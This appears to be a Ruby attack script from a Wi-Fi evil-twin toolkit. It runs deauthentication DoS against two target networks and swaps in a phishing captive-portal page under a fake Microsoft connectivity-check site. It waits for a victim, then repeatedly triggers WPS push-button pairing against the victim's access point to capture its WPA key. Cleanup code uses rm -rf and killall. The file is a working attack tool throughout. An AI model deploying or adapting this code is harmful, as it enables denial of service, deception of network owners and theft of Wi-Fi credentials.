#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Exiting and cleaning your files....\e[0m"
sleep 3
Dir.chdir '/tmp'
sleep 1
if File.exist?("hostapd.psk")
`rm -rf hostapd.psk`
`rm -rf *.pid`
`killall hostapd`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1
`rm -rf *.txt`
puts "Reseting your second wifi card as wlan1..."
`airmon-ng stop wlan5mon`
sleep 5
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ifconfig wlan1 up`
         sleep 4
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
puts "Bye..."
exit
else
`rm -rf *.pid`
`killall airbase-ng`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1
`rm -rf *.txt`
puts "Reseting your second wifi card as wlan1..."
`airmon-ng stop wlan5mon`
sleep 5
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ifconfig wlan1 up`
         sleep 4
`systemctl enable NetworkManager.service`
sleep 3
`systemctl start NetworkManager.service`
sleep 5
puts "Bye..."
exit
end
end

class Start
def self.interface
load 'accessdos.rb'
puts "Starting your second wifi-card..."
system "airmon-ng start #{$cartedos}"
sleep 5
Start.activeDos
end

def self.activeDos
puts "Active DoS for both SSID 1 will start now..."
dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Start.dosBis
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.dosBis
puts "Active DoS for both SSID 2 will start now..."
dosbis = Thread.new { `bash rundosbis.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve)
Start.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente      
puts "Wait for the victim..."
`cat mac1ssid1.txt mac2ssid1.txt mac3ssid1.txt > logmac.txt`
until File.read('hostapd.txt').include?('STARTED')
sleep 1
end
File.open("logmac.txt").readlines.each do |logmac|
   puts logmac
$logmac = logmac.chomp
if File.read('hostapd.txt').include?($logmac)
puts "\e[1;32m[*] Victim from SSID 1 identified\e[0m"
load 'historique.rb'
puts $apmac
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
break
else
puts "\e[1;32m[*] Victim from SSID 2 identified\e[0m"
load 'historiquebis.rb'
`rm -rf apmac.txt`
`mv apmacbis.txt apmac.txt`
puts $apmac
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$pagebis}.php index.php`
break
end
end
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1
puts "\e[1;32m[*] Stoping DoS attack...\e[0m"
Process.kill 15, File.read('/tmp/terminal.pid').to_i
Process.kill 15, File.read('/tmp/terminalbis.pid').to_i
`killall xterm`
`killall sleep`
sleep 1
puts "Restarting second wireless card and lauching wpa_cli..."
`airmon-ng stop #{$cartedos}mon`
sleep 4
`rfkill unblock all`
`ifconfig #{$cartedos} up`
sleep 4
       puts "Configuring wpa_cli...waiting for push button..."
`killall wpa_supplicant`
Dir.chdir '/etc'
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.1EN/wpa_supplicant.conf /etc/`
sleep 1;
puts $apmac
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}"   # On lance wpa_cli et wps_pbc en tant que thread
    sleep(120) # Temps avant la relance de la commande
  end
end
Wps.wpsGrab  
sleep(5000000)
end
end

class Wps
def self.wpsGrab
Dir.chdir '/etc'
sleep 1
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] The WPS button has been pushed, WPA-PSK is:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |wpa|
   puts wpa
end
end
end
